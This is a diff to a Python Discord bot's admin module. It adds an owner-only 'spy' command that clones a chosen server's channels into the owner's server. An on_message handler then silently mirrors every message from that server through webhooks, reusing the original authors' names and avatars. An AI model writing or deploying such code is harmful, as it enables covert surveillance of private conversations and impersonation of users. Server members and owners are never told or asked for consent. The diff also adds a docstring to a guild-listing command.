@@ -9,7 +9,7 @@ import discord
 from discord.ext import commands
 
 import statics
-from cogs.utils import checks, formatter
+from cogs.utils import checks, formatter, backups
 
 fake_token = "mfa.VkO_2G4Qv3T--YOU--lWetW_tjND--TRIED--QFTm6YGtzq9PH--4U--tG0"
 em = formatter.embed_message
@@ -19,12 +19,63 @@ class Admin:
     def __init__(self, bot):
         self.bot = bot
         self._last_result = None
+        self.spys = {}
 
     async def __local_check(self, ctx):
         return checks.is_bot_admin(ctx)
 
     @commands.command()
+    @commands.is_owner()
+    async def spy(self, ctx, guild_id: int):
+        if guild_id == 0:
+            self.spys = {}
+            await ctx.send(**em("Deactivated all spys", type="success"))
+            return
+
+        guild = self.bot.get_guild(guild_id)
+        if guild is None:
+            raise commands.BadArgument("I was **unable to find that guil**.")
+
+        self.spys[guild] = {"child": ctx.guild, "ids": await backups.copy_guild(guild, ctx.guild)}
+
+    async def on_message(self, msg):
+        spy = self.spys.get(msg.guild)
+        if spy is None:
+            return
+
+        target = spy["child"]
+        ids = spy["ids"]
+
+        channel = target.get_channel(ids.get(msg.channel.id))
+        if channel is None:
+            return
+
+        webhooks = await channel.webhooks()
+        if len(webhooks) == 0:
+            webhook = await channel.create_webhook(name="spy")
+
+        else:
+            webhook = webhooks[0]
+
+        try:
+            await webhook.send(
+                username=msg.author.name,
+                avatar_url=msg.author.avatar_url,
+                content=msg.system_content,
+                embeds=msg.embeds
+            )
+        except:
+            pass
+
+    @commands.command()
     async def guilds(self, ctx, limit: int = 20, reverse: bool = True, owner: discord.User = None):
+        """
+        Shows the the guilds the bot is on, sorted by member count
+
+        **limit**: The count of guilds
+        **reverse**: Start with the lowest member count
+        **owner**: Only show guilds owned by a specific user
+        """
         guilds = sorted([guild for guild in self.bot.guilds if owner is None or guild.owner.id == owner.id],
                         reverse=reverse, key=lambda g: g.member_count)[:limit]
         table = PrettyTable()
